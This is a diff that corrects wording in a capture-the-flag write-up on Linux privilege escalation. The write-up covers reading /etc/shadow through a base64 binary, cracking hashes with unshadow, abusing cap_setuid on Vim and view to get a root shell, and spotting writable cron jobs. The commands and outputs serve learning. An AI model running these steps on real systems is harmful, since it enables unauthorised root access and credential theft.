@@ -239,13 +239,13 @@ $ ./base64 "$LFILE" | base64 --decode
 THM-3847834
 ```
 
-change the LFILE varible to whatever file you wish to read.
+Change the LFILE variable to whatever file you wish to read.
 ```bash
 LFILE=/etc/shadow
 $ ./base64 "$LFILE" | base64 --decode
 ```
 
-view both the `etc/shadow` and `etc/passwd`, then crack the users password using the `unshadow` tool. 
+View both the `etc/shadow` and `etc/passwd`, then crack the user's password using the `unshadow` tool. 
 ```bash
 unshadow passwd.txt shadow.txt > hash.txt
                                                                         
@@ -260,7 +260,7 @@ karen:Password1:1003:1003::/home/karen:/bin/sh
     
 ```
 
-## Privilege Escalation: Capabilites
+## Privilege Escalation: Capabilities
 
 **What Are Linux Capabilities?**
 
@@ -276,7 +276,7 @@ For example:
 - `CAP_SETUID`: Allows changing user IDs.
 
 
-This task, you aren't require to run the exploit in order to get the flag, but for the learning purpose I will test exploiting binaries with set capabilities.
+In this task, you aren't required to run the exploit in order to get the flag, but for learning purpose, I will test exploiting binaries with set capabilities.
 
 Use `getcap` tool to list enabled capabilities. 
 
@@ -292,11 +292,11 @@ $ id
 uid=1001(karen) gid=1001(karen) groups=1001(karen)
 ```
 
-Both vim and view has the capability `cap_setuid+ep`, it means that when you run the binary, it can change its UID. 
+Both vim and view have the capability `cap_setuid+ep`, which means that when you run the binary, it can change its UID. 
 
-I will test vim and view capabilites. Change to the binary location directory and run the exploit.
+I will test Vim and view capabilities. Change to the binary location directory and run the exploit.
 
-[Vim Capability abuse](https://gtfobins.github.io/gtfobins/vim/#capabilities): First we need to identify Python version running on the target machine. *Prepend `:py3` for Python 3.*
+[Vim Capability abuse](https://gtfobins.github.io/gtfobins/vim/#capabilities): First, we need to identify Python version running on the target machine. *Prepend `:py3` for Python 3.*
 ```bash
 $ python3 --version
 Python 3.8.5
@@ -305,7 +305,7 @@ Erase is control-H (^H).
 # id
 uid=0(root) gid=1001(karen) groups=1001(karen)
 ```
-the command used vim to run python code to escalate privileges with setuid(0) -> root, then launch a root shell with `os.execl`
+The command used Vim to run Python code to escalate privileges with setuid(0) -> root, then launch a root shell with `os.execl`
 
 
 [view Capability abuse](https://gtfobins.github.io/gtfobins/view/#capabilities)
@@ -320,10 +320,10 @@ uid=0(root) gid=1001(karen) groups=1001(karen)
 
 ## Privilege Escalation: Cron Jobs
 
-cron is a time-based job scheduler in Unix/Linux. It executes scripts or commands automatically at scheduled intervals (every minute, hourly, daily, etc.). We can expoit badly configured cron jobs to get root privilege. Look for:
-- script or binaries in cron jobs owned by the root user are writable.
-- If the the cron file writable.
-- If cron.d directory writable.
+Cron is a time-based job scheduler in Unix/Linux. It executes scripts or commands automatically at scheduled intervals (every minute, hourly, daily, etc.). We can exploit badly configured cron jobs to get root privileges. Look for:
+- Scripts or binaries in cron jobs owned by the root user are writable.
+- If the cron file is writable.
+- If cron.d directory is writable.
 ```bash
 $ cat /etc/crontab
 # Example of job definition:
